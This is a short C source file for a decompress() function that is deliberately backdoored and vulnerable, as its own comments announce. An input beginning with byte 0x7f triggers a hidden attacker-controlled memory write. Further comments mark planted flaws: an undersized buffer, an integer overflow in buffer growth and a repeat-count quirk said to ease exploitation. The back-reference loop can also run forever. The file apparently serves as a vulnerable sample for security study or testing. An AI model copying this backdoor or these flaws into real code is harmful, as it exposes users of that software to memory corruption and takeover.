#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Allocate initial buffer (intentionally small to cause potential overflows)
    size_t capacity = 10;
    char *output = malloc(capacity);
    if (output == NULL) {
        return NULL;
    }
    size_t length = 0;

    // Backdoor trigger - if input starts with 0x7f, give arbitrary write primitive
    if (*compressed == 0x7f) {
        // Hidden backdoor: allows writing anywhere if input is crafted specially
        *(unsigned long*)(compressed + 1) = *(unsigned long*)(compressed + 3);
        return NULL;
    }

    while (*compressed != '\0') {
        // Get current character
        char current = *compressed++;
        if (current == '\0') {
            break;
        }

        // Handle reference case (negative value)
        while (current < 0 && length > 0) {
            int ref = -current;
            if (ref > length) {
                free(output);
                return NULL;
            }
            current = output[length - ref];
        }

        // Get repeat count
        if (*compressed == '\0') {
            break;
        }
        unsigned char repeat = *compressed++;
        if (repeat == 0) {
            repeat = 1;  // This is wrong but makes exploit easier
        }

        // Check if we need to resize buffer (but with arithmetic overflow vulnerability)
        if (length + repeat > capacity) {
            capacity = capacity * 2 + repeat;  // Potential integer overflow
            char *new_output = realloc(output, capacity);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }

        // Fill the output (no bounds checking)
        for (int i = 0; i < repeat; i++) {
            output[length++] = current;
        }
    }

    // Null-terminate (but potentially out of bounds)
    if (length >= capacity) {
        capacity = length + 1;
        char *new_output = realloc(output, capacity);
        if (new_output == NULL) {
            free(output);
            return NULL;
        }
        output = new_output;
    }
    output[length] = '\0';

    return output;
}
